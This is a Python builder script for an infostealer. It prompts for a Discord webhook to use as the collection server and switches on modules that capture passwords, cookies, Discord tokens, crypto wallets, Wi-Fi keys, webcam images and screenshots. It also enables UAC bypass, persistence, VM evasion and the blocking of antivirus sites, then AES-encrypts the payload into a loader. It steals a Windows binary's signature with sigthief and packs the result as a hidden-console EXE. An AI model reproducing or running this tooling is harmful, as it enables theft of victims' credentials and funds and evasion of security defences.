#!/usr/bin/env python3
import sys, os, json, base64, zlib, subprocess, random, string
import pyaes
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

CONFIG_FILE = "config.json"
SOURCE_FILE = "process.py"
LOADER_TEMPLATE = "loader_template.py"
LOADER_OUTPUT = "loader-o.py"
ICON_FILE = "icon.png"

def read_config():
    with open(CONFIG_FILE) as f:
        return json.load(f)

def write_config(settings):
    with open(CONFIG_FILE, "w") as f:
        json.dump(settings, f, indent=4)

def encrypt_string(s):
    return 'base64.b64decode("{}").decode()'.format(base64.b64encode(s.encode()).decode())

def inject_settings(code, settings, injection):
    c2 = settings["settings"]["c2"]
    code = code.replace('"%c2%"', "(%d, %s)" % (c2[0], encrypt_string(c2[1])))
    code = code.replace('"%mutex%"', encrypt_string(settings["settings"]["mutex"]))
    code = code.replace('"%archivepassword%"', encrypt_string(settings["settings"]["archivePassword"]))
    code = code.replace('%pingme%', "true" if settings["settings"]["pingme"] else "")
    code = code.replace('%vmprotect%', "true" if settings["settings"]["vmprotect"] else "")
    code = code.replace('%startup%', "true" if settings["settings"]["startup"] else "")
    code = code.replace('%melt%', "true" if settings["settings"]["melt"] else "")
    code = code.replace('%uacBypass%', "true" if settings["settings"]["uacBypass"] else "")
    code = code.replace('%hideconsole%', "true" if settings["settings"]["consoleMode"] in (0,1) else "")
    code = code.replace('%debug%', "true" if settings["settings"]["debug"] else "")
    code = code.replace('%boundfilerunonstartup%', "true" if settings["settings"]["boundFileRunOnStartup"] else "")
    code = code.replace('%capturewebcam%', "true" if settings["modules"]["captureWebcam"] else "")
    code = code.replace('%capturepasswords%', "true" if settings["modules"]["capturePasswords"] else "")
    code = code.replace('%capturecookies%', "true" if settings["modules"]["captureCookies"] else "")
    code = code.replace('%capturehistory%', "true" if settings["modules"]["captureHistory"] else "")
    code = code.replace('%captureautofills%', "true" if settings["modules"]["captureAutofills"] else "")
    code = code.replace('%capturediscordtokens%', "true" if settings["modules"]["captureDiscordTokens"] else "")
    code = code.replace('%capturegames%', "true" if settings["modules"]["captureGames"] else "")
    code = code.replace('%capturewifipasswords%', "true" if settings["modules"]["captureWifiPasswords"] else "")
    code = code.replace('%capturesysteminfo%', "true" if settings["modules"]["captureSystemInfo"] else "")
    code = code.replace('%capturescreenshot%', "true" if settings["modules"]["captureScreenshot"] else "")
    code = code.replace('%capturetelegram%', "true" if settings["modules"]["captureTelegramSession"] else "")
    code = code.replace('%capturecommonfiles%', "true" if settings["modules"]["captureCommonFiles"] else "")
    code = code.replace('%capturewallets%', "true" if settings["modules"]["captureWallets"] else "")
    code = code.replace('%fakeerror%', "true" if settings["modules"]["fakeError"][0] else "")
    code = code.replace("%title%", settings["modules"]["fakeError"][1][0])
    code = code.replace("%message%", settings["modules"]["fakeError"][1][1])
    code = code.replace("%icon%", str(settings["modules"]["fakeError"][1][2]))
    code = code.replace('%blockavsites%', "true" if settings["modules"]["blockAvSites"] else "")
    code = code.replace('%discordinjection%', "true" if settings["modules"]["discordInjection"] else "")
    if injection:
        code = code.replace("%injectionbase64encoded%", base64.b64encode(injection.encode()).decode())
    return code

def fetch_injection():
    try:
        from urllib3 import PoolManager
        http = PoolManager(cert_reqs="CERT_NONE")
        resp = http.request("GET", "https://raw.githubusercontent.com", timeout=5)
        if b"discord.com" in resp.data:
            return resp.data.decode().strip()
    except:
        pass
    return None

def prepare_environment(settings):
    if os.path.isfile("bound.exe"):
        with open("bound.exe", "rb") as f:
            data = f.read()
        enc = zlib.compress(data)[::-1]
        with open("bound.blank", "wb") as f:
            f.write(enc)
    elif os.path.isfile("bound.blank"):
        os.remove("bound.blank")
    if settings["settings"]["consoleMode"] == 0:
        open("noconsole", "w").close()
    elif os.path.isfile("noconsole"):
        os.remove("noconsole")
    pumped = settings["settings"]["pumpedStubSize"]
    if pumped > 0:
        with open("pumpStub", "w") as f:
            f.write(str(pumped))
    elif os.path.isfile("pumpStub"):
        os.remove("pumpStub")

def clone_certificate():
    if not os.path.isfile("sigthief.py"):
        return
    try:
        system_root = os.getenv("SystemRoot")
        candidates = []
        for path in [system_root, os.path.join(system_root, "System32"), os.path.join(system_root, "SysWOW64")]:
            if os.path.isdir(path):
                for f in os.listdir(path):
                    if f.endswith(".exe") and os.path.isfile(os.path.join(path, f)):
                        candidates.append(os.path.join(path, f))
        if not candidates:
            return
        chosen = random.choice(candidates)
        subprocess.run(["python", "sigthief.py", "-i", chosen, "-o", "cert"], capture_output=True)
    except:
        pass

def main():
    banner="""

█   █  ███  ████   ███  █████  ███  ████  █   █ █     
██  █ █   █ █   █ █   █   █   █   █ █   █ █   █ █     
█ █ █ █████ ████  █████   █   █   █ ████  █   █ █     
█  ██ █   █ █  █  █   █   █   █   █ █  █  █   █ █     
█   █ █   █ █   █ █   █   █    ███  █   █  ███  █████ 


"""
    print(banner)
    settings = read_config()
    c2 = settings["settings"]["c2"]
    webhook = c2[1]

    if not webhook.strip():
        print("[?] Webhook URL is empty in config.json")
        new_webhook = input("Enter Discord webhook URL: ").strip()
        if new_webhook:
            settings["settings"]["c2"][1] = new_webhook
            write_config(settings)
            print("[+] Webhook saved to config.json")
        else:
            print("[-] No webhook provided, aborting.")
            sys.exit(1)

    archive_pass = input("[?] Enter archive password (or press Enter to use default 'blank123'): ").strip()
    if archive_pass:
        settings["settings"]["archivePassword"] = archive_pass
        write_config(settings)
    else:
        archive_pass = settings["settings"]["archivePassword"]

    exe_name = input("[?] Enter output EXE name (without .exe, default: loader-o): ").strip()
    if not exe_name:
        exe_name = "loader-o"
    if not exe_name.endswith(".exe"):
        exe_name += ".exe"

    icon_arg = ""
    if os.path.isfile(ICON_FILE):
        icon_arg = f"--icon={ICON_FILE}"
        print(f"[+] Icon found: {ICON_FILE}")
    else:
        print("[!] No icon.png found, building without icon.")

    if not os.path.isfile(SOURCE_FILE):
        print(f"[-] Source file {SOURCE_FILE} not found.")
        sys.exit(1)

    with open(SOURCE_FILE, "r", encoding="utf-8") as f:
        code = f.read()

    injection = fetch_injection()
    code = inject_settings(code, settings, injection)
    prepare_environment(settings)

    source_bytes = code.encode("utf-8")
    compressed = zlib.compress(source_bytes, level=9)

    pad_len = 16 - (len(compressed) % 16)
    padded = compressed + bytes([pad_len]) * pad_len

    key = os.urandom(32)
    iv = os.urandom(16)
    aes = pyaes.AESModeOfOperationCBC(key, iv)

    encrypted_blocks = []
    for i in range(0, len(padded), 16):
        block = padded[i:i+16]
        encrypted_blocks.append(aes.encrypt(block))
    encrypted = b''.join(encrypted_blocks)
    encrypted = encrypted[::-1]

    encrypted_b64 = base64.b64encode(encrypted).decode()

    if not os.path.isfile(LOADER_TEMPLATE):
        print(f"[-] Loader template {LOADER_TEMPLATE} not found.")
        sys.exit(1)

    with open(LOADER_TEMPLATE, "r", encoding="utf-8") as f:
        loader_template = f.read()

    key_b64 = base64.b64encode(key).decode()
    iv_b64 = base64.b64encode(iv).decode()

    loader_code = loader_template % (encrypted_b64, key_b64, iv_b64)

    with open(LOADER_OUTPUT, "w", encoding="utf-8") as f:
        f.write(loader_code)

    clone_certificate()

    print("[+] Building EXE with PyInstaller...")
    cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        icon_arg,
        "--name", os.path.splitext(exe_name)[0],
        LOADER_OUTPUT
    ]
    cmd = [c for c in cmd if c]
    result = subprocess.run(cmd)
    if result.returncode != 0:
        print("[-] PyInstaller failed.")
        sys.exit(1)

    print(f"[+] Build complete! Output: dist\\{exe_name}")

if __name__ == "__main__":
    main()
